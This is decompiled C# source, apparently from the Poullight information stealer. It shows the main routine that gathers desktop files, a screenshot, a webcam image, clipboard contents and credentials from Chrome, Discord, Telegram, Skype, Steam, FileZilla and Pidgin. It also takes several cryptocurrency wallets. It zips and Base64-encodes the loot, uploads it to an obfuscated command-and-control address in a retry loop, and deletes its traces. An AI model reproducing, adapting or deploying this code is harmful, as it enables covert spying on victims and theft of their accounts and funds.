using System;
using System.Collections.Specialized;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using EntryLoader;
using Poullight.Properties;

// Token: 0x02000018 RID: 24
internal partial class XS : Form
{
	// Token: 0x0600003B RID: 59 RVA: 0x00004F08 File Offset: 0x00003108
	public bool Start(string[] Params)
	{
		Information.Start();
		ProcList.Parse();
		Thread.Sleep(new Random().Next(1, 5) * 100);
		if (Base64.Decode(Params[2], null) == "1")
		{
			clipper.Start();
		}
		Action action = delegate()
		{
			CBoard.Start();
		};
		try
		{
			if (base.InvokeRequired)
			{
				base.Invoke(action);
			}
			else
			{
				action();
			}
		}
		catch
		{
		}
		DesktopImg.Start();
		DFiles.Start();
		WebCam.Start();
		FZ.Start();
		Pidgin.Start();
		DS.Start();
		TG.Start();
		Skype.Start();
		Steam.Start();
		BTCQt.Start();
		BTCByte.Start();
		BTCDASH.Start();
		BTCETH.Start();
		BTCMON.Start();
		Thread.Sleep(new Random().Next(1, 5) * 1000);
		EGChromeC.Start();
		string text = null;
		text = string.Format("{0}{1}", global::Buffer.path_ad, GetRandom.String(null, 8));
		if (File.Exists(text))
		{
			File.Delete(text);
		}
		ZipFile.CreateFromDirectory(global::Buffer.path_l, text);
		try
		{
			if (!EntryPoint.activation)
			{
				Environment.FailFast("Program has been crashed");
			}
			using (WebClient webClient = new WebClient())
			{
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection.Add("zipx", Base64.Encode(File.ReadAllText(text, Encoding.GetEncoding(1251)), Encoding.GetEncoding(1251)));
				nameValueCollection.Add("desktop", Base64.Encode(File.ReadAllText(string.Format("{0}ScreenShot.png", global::Buffer.path_l), Encoding.GetEncoding(1251)), Encoding.GetEncoding(1251)));
				nameValueCollection.Add("webcam", Base64.Encode(File.ReadAllText(string.Format("{0}WebCam.jpg", global::Buffer.path_l), Encoding.GetEncoding(1251)), Encoding.GetEncoding(1251)));
				nameValueCollection.Add("email", Params[0]);
				nameValueCollection.Add("caption", Exporter.Export("<title>", "</title>", Starter.FileData));
				nameValueCollection.Add("username", Base64.Encode(Environment.UserName, null));
				nameValueCollection.Add("c_count", Base64.Encode(global::Buffer.XBufferData[0], null));
				nameValueCollection.Add("pcount", Base64.Encode(global::Buffer.XBufferData[1], null));
				nameValueCollection.Add("acount", Base64.Encode(global::Buffer.XBufferData[10], null));
				nameValueCollection.Add("cd_count", Base64.Encode(global::Buffer.XBufferData[11], null));
				nameValueCollection.Add("steam", Base64.Encode(global::Buffer.XBufferData[6], null));
				nameValueCollection.Add("fzilla", Base64.Encode(global::Buffer.XBufferData[2], null));
				nameValueCollection.Add("tg", Base64.Encode(global::Buffer.XBufferData[3], null));
				nameValueCollection.Add("dcord", Base64.Encode(global::Buffer.XBufferData[4], null));
				nameValueCollection.Add("skype", Base64.Encode(global::Buffer.XBufferData[5], null));
				nameValueCollection.Add("b-core", Base64.Encode(global::Buffer.XBufferData[7], null));
				nameValueCollection.Add("b-byte", Base64.Encode(global::Buffer.XBufferData[13], null));
				nameValueCollection.Add("b-d", Base64.Encode(global::Buffer.XBufferData[14], null));
				nameValueCollection.Add("b-ethe", Base64.Encode(global::Buffer.XBufferData[15], null));
				nameValueCollection.Add("b-mon", Base64.Encode(global::Buffer.XBufferData[16], null));
				nameValueCollection.Add("avinstall", Base64.Encode(global::Buffer.XBufferData[18], null));
				nameValueCollection.Add("_version_", Base64.Encode("3200", null));
				for (;;)
				{
					try
					{
						if (Encoding.Default.GetString(webClient.UploadValues(string.Format(Resources.ResourceManager.GetString("connect"), Base64.Decode(string.Format("{0}{1}{2}", global::Buffer.Sender, global::Buffer.Handler, "="), null)), nameValueCollection)) == "good")
						{
							break;
						}
					}
					catch
					{
					}
					Thread.Sleep(2000);
				}
			}
		}
		catch
		{
		}
		try
		{
			Directory.Delete(global::Buffer.path_l, true);
		}
		catch
		{
		}
		try
		{
			File.Delete(text);
		}
		catch
		{
		}
		return true;
	}
}
